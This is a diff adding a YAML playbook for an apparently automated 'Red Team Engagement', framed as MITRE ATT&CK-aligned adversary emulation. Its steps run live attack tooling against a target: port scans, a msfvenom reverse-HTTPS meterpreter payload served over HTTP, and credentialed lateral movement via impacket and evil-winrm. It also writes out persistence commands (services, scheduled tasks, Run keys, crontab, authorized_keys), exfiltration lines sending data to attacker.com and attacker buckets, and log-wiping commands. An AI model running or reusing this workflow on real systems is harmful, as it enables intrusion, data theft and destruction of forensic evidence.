@@ -1,0 +1,293 @@
+name: "Red Team Engagement"
+description: >
+  Full-spectrum adversary emulation lifecycle covering initial access,
+  command & control, privilege escalation, lateral movement, persistence,
+  data exfiltration, and operational security. Aligned to MITRE ATT&CK
+  framework. Provider-agnostic — works on-prem or cloud.
+version: "2.0"
+target_required: true
+
+vars:
+  c2_framework: ""
+  phish_template: ""
+  beacon_interval: 60
+  exfil_channel: ""
+  domain: ""
+  username: ""
+  password: ""
+  hash: ""
+  listen_host: ""
+  listen_port: 4444
+
+preflight:
+  - id: preamble
+    type: log
+    message: "Red team engagement — {target} case: {case_id} (C2: {c2_framework})"
+
+steps:
+  # Phase 1: Reconnaissance & targeting
+  - id: recon
+    name: "Target reconnaissance"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: osint_gather
+        name: "OSINT gathering"
+        tool: python3
+        args: ["-c", "import sys; print(f'OSINT for {sys.argv[1]}: check DNS, WHOIS, Shodan, Censys, social media, job postings, GitHub, tech stacks, subdomains, breached creds')",
+               "{target}"]
+        save: "{case_dir}/osint-notes.txt"
+        timeout: 15
+
+      - id: subdomain_enum
+        name: "Subdomain enumeration"
+        tool: subfinder
+        args: ["-d", "{domain}", "-all", "-o", "{case_dir}/subdomains.txt"]
+        timeout: 120
+        artifacts:
+          - "{case_dir}/subdomains.txt"
+
+      - id: port_scan
+        name: "External port scan"
+        tool: nmap
+        args: ["-sS", "-sV", "-Pn", "-p", "1-65535", "--open",
+               "{target}", "-oN", "{case_dir}/external-ports.txt"]
+        timeout: 600
+        artifacts:
+          - "{case_dir}/external-ports.txt"
+
+      - id: tech_detect
+        name: "Technology fingerprinting"
+        tool: whatweb
+        args: ["-a", "3", "{target}"]
+        save: "{case_dir}/tech-detect.txt"
+        timeout: 60
+
+  # Phase 2: Initial access
+  - id: initial_access
+    name: "Initial access vectors"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: phish_prep
+        name: "Phishing campaign preparation"
+        tool: python3
+        args: ["-c", "import sys; t=sys.argv[1]; print(f'Target: {t}\\nTemplate: {sys.argv[2] if len(sys.argv)>2 else \"default\"}\\nSetup: GoPhish campaign, tracking pixel, redirector, landing page')",
+               "{target}", "{phish_template}"]
+        save: "{case_dir}/phish-plan.txt"
+        timeout: 15
+
+      - id: web_exploit
+        name: "Web application exploitation"
+        tool: nuclei
+        args: ["-u", "{target}", "-severity", "critical,high",
+               "-o", "{case_dir}/web-exploits.txt"]
+        timeout: 300
+        artifacts:
+          - "{case_dir}/web-exploits.txt"
+
+      - id: vpn_check
+        name: "VPN/remote access fingerprint"
+        tool: nmap
+        args: ["-sV", "-Pn", "-p", "443,8443,1194,1723,500,4500",
+               "{target}", "-oN", "{case_dir}/vpn-ports.txt"]
+        timeout: 120
+
+  # Phase 3: Command & Control
+  - id: c2_deploy
+    name: "C2 infrastructure deployment"
+    type: sequential
+    steps:
+      - id: c2_setup
+        name: "Deploy C2 framework"
+        tool: python3
+        args: ["-c", "import sys; f=sys.argv[1]; ct={'cobaltstrike':'Start teamserver, deploy listeners, generate payloads','sliver':'sliver-server operator --name red --lhost '+sys.argv[2]+' --lport '+sys.argv[3],'metasploit':'msfconsole -q -x \\\"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST '+sys.argv[2]+'; set LPORT '+sys.argv[3]+'; exploit -j\\\"','mythic':'docker-compose -f /opt/Mythic/docker-compose.yml up -d; configure agents','havoc':'havoc server --profile default; havoc client'}; print(ct.get(f,f'Unknown C2: {f}'))",
+               "{c2_framework}", "{listen_host}", "{listen_port}"]
+        save: "{case_dir}/c2-setup.txt"
+        timeout: 60
+
+      - id: payload_gen
+        name: "Generate staged payloads"
+        tool: msfvenom
+        args: ["-p", "windows/x64/meterpreter/reverse_https",
+               "LHOST={listen_host}", "LPORT={listen_port}",
+               "-f", "exe", "-o", "{case_dir}/payload.exe"]
+        timeout: 60
+        artifacts:
+          - "{case_dir}/payload.exe"
+
+      - id: payload_host
+        name: "Host payload for delivery"
+        tool: python3
+        args: ["-m", "http.server", "8080"]
+        timeout: 300
+        when: "has:listen_host"
+
+  # Phase 4: Privilege escalation
+  - id: privesc
+    name: "Privilege escalation"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: win_privesc
+        name: "Windows privilege escalation"
+        tool: python3
+        args: ["-c", "import sys; print('WinPEAS, SharpUp, Seatbelt, PowerUp, JAWS, Watson, Sherlock, Hot Potato, PrintNightmare, JuicyPotato, SweetPotato, TokenKidnapping, UAC bypass, AlwaysInstallElevated, UnquotedPaths, ACL abuse, ServicePerms, DLL hijacking, MSI exploitation')"]
+        save: "{case_dir}/win-privesc-vectors.txt"
+        timeout: 15
+
+      - id: lin_privesc
+        name: "Linux privilege escalation"
+        tool: python3
+        args: ["-c", "import sys; print('LinPEAS, linux-smart-enum, suid, sgid, capabilities, cron, PATH hijack, NFS, sudo -l, kernel exploits, LXD, docker, lxc, apparmor bypass, polkit, CVE-2021-4034, CVE-2023-2640, CVE-2022-0847, CVE-2023-32629')"]
+        save: "{case_dir}/lin-privesc-vectors.txt"
+        timeout: 15
+
+      - id: cloud_privesc
+        name: "Cloud privilege escalation"
+        tool: python3
+        args: ["-c", "import sys; print('IAM role chaining, policy escalation, service account impersonation, workload identity abuse, cloud cross-account pivoting, SCIM provisioning abuse, privilege escalation through deployment pipelines')"]
+        save: "{case_dir}/cloud-privesc-vectors.txt"
+        timeout: 15
+
+  # Phase 5: Lateral movement
+  - id: lateral
+    name: "Lateral movement"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: smb_psexec
+        name: "SMB lateral movement"
+        tool: impacket-psexec
+        args: ["{domain}/{username}:{password}@{target}",
+               "whoami"]
+        timeout: 30
+        when: "has:password"
+
+      - id: smb_wmi
+        name: "WMI lateral movement"
+        tool: impacket-wmiexec
+        args: ["{domain}/{username}:{password}@{target}",
+               "whoami"]
+        timeout: 30
+        when: "has:password"
+
+      - id: ssh_pivot
+        name: "SSH lateral movement"
+        tool: ssh
+        args: ["-o", "StrictHostKeyChecking=no",
+               "-o", "UserKnownHostsFile=/dev/null",
+               "{username}@{target}", "whoami"]
+        timeout: 30
+        when: "has:username"
+
+      - id: winrm_lateral
+        name: "WinRM lateral movement"
+        tool: evil-winrm
+        args: ["-i", "{target}", "-u", "{username}",
+               "-p", "{password}", "-c", "whoami"]
+        timeout: 30
+        when: "has:password"
+
+  # Phase 6: Persistence
+  - id: persistence
+    name: "Establish persistence"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: service_persist
+        name: "Windows service persistence"
+        tool: python3
+        args: ["-c", "import sys; print('Service creation: sc create RedTeamSvc binPath= C:\\\\payload.exe start= auto\\nScheduled task: schtasks /create /tn RedTeam /tr C:\\\\payload.exe /sc onstart\\nRegistry run: reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v RedTeam /t REG_SZ /d C:\\\\payload.exe\\nWMI subscription, Startup folder, DLL search order hijacking, COM hijacking, Netsh helper, Time provider')"]
+        save: "{case_dir}/win-persistence.txt"
+        timeout: 15
+
+      - id: cron_persist
+        name: "Linux cron persistence"
+        tool: python3
+        args: ["-c", "import sys; print('Cron job: echo \\\"* * * * * root /tmp/payload.sh\\\" >> /etc/crontab\\nSystemd: systemd service unit persistence\\nSSH authorized_keys: echo \\\"ssh-rsa AAA...\\\" >> ~/.ssh/authorized_keys\\nLD_PRELOAD, .bashrc, .profile, PAM abuse, kernel module, at, anacron, timers')"]
+        save: "{case_dir}/lin-persistence.txt"
+        timeout: 15
+
+  # Phase 7: Data exfiltration
+  - id: exfil
+    name: "Data exfiltration"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: exfil_dns
+        name: "DNS exfiltration setup"
+        tool: python3
+        args: ["-c", "import sys; print(f'DNS exfil: dig +short TXT exfil.{sys.argv[1]}\\nData encoding: base64 + subdomain per chunk\\nTools: dnscat2, Iodine, Heyoka, Cobalt Strike DNS beacon')",
+               "{domain}"]
+        save: "{case_dir}/dns-exfil.txt"
+        timeout: 15
+
+      - id: exfil_http
+        name: "HTTP/HTTPS exfiltration"
+        tool: python3
+        args: ["-c", "import sys; print(f'HTTP exfil: curl -X POST -d @data.json https://attacker.com/exfil\\nHTTPS with custom headers, PUT requests, multipart upload, WebSocket, Server-Sent Events, GraphQL mutations, H2C smuggling')"]
+        save: "{case_dir}/http-exfil.txt"
+        timeout: 15
+
+      - id: exfil_cloud
+        name: "Cloud storage exfiltration"
+        tool: python3
+        args: ["-c", "import sys; print('S3: aws s3 cp secret.zip s3://attacker-bucket/\\nCloud: gsutil cp secret.zip gs://attacker-bucket/\\nAzCopy: azcopy copy secret.zip https://attacker.blob.core.windows.net/exfil/\\nSteganography: embed in images, audio, video')"]
+        save: "{case_dir}/cloud-exfil.txt"
+        timeout: 15
+
+  # Phase 8: Operational security & cleanup
+  - id: opsec
+    name: "Operational security"
+    type: sequential
+    steps:
+      - id: log_cleanup
+        name: "Log and artifact cleanup"
+        tool: python3
+        args: ["-c", "import sys; print('Windows: wevtutil cl System; wevtutil cl Security; wevtutil cl Application\\nLinux: rm -rf /var/log/*; > ~/.bash_history; shred -zu /tmp/*\\nRemove binaries, service entries, scheduled tasks, cron jobs, SSH keys, registry keys, WMI subscriptions')"]
+        save: "{case_dir}/cleanup-checklist.txt"
+        timeout: 15
+
+      - id: cover_check
+        name: "Operational cover review"
+        tool: python3
+        args: ["-c", "import sys; print('Review: are C2 domains still resolving? Are beacons checking in? Any alerts triggered? Logs shipped out? Persistence still active? User accounts still enabled?')"]
+        save: "{case_dir}/opsec-review.txt"
+        timeout: 15
+
+  # Phase 9: Report
+  - id: report
+    name: "Red team engagement report"
+    type: report
+    format: markdown
+    title: "Red Team Engagement — {target}"
+    output: "{case_dir}/red-team-report.md"
+    sections:
+      - heading: "Engagement Overview"
+        body: "- Target: {target}\n- C2: {c2_framework}\n- Case: {case_id}"
+      - heading: "Reconnaissance"
+        body: "- OSINT: {case_dir}/osint-notes.txt\n- Subdomains: {case_dir}/subdomains.txt\n- Ports: {case_dir}/external-ports.txt"
+      - heading: "Initial Access"
+        body: "- Phishing: {case_dir}/phish-plan.txt\n- Web exploits: {case_dir}/web-exploits.txt"
+      - heading: "C2 Infrastructure"
+        body: "- Setup: {case_dir}/c2-setup.txt\n- Payload: {case_dir}/payload.exe"
+      - heading: "Privilege Escalation"
+        body: "- Windows: {case_dir}/win-privesc-vectors.txt\n- Linux: {case_dir}/lin-privesc-vectors.txt\n- Cloud: {case_dir}/cloud-privesc-vectors.txt"
+      - heading: "Lateral Movement"
+        body: "- SMB/WMI/WinRM lateral movement results"
+      - heading: "Persistence"
+        body: "- Windows: {case_dir}/win-persistence.txt\n- Linux: {case_dir}/lin-persistence.txt"
+      - heading: "Exfiltration"
+        body: "- DNS: {case_dir}/dns-exfil.txt\n- HTTP: {case_dir}/http-exfil.txt\n- Cloud: {case_dir}/cloud-exfil.txt"
+      - heading: "OPSEC"
+        body: "- Cleanup: {case_dir}/cleanup-checklist.txt\n- Review: {case_dir}/opsec-review.txt"
+
+postflight:
+  - id: cleanup
+    type: log
+    message: "Red team engagement complete — {case_dir}"
+  - id: done
+    type: notify
+    level: success
+    message: "Red team engagement finished for {target}. Report at {case_dir}/red-team-report.md"
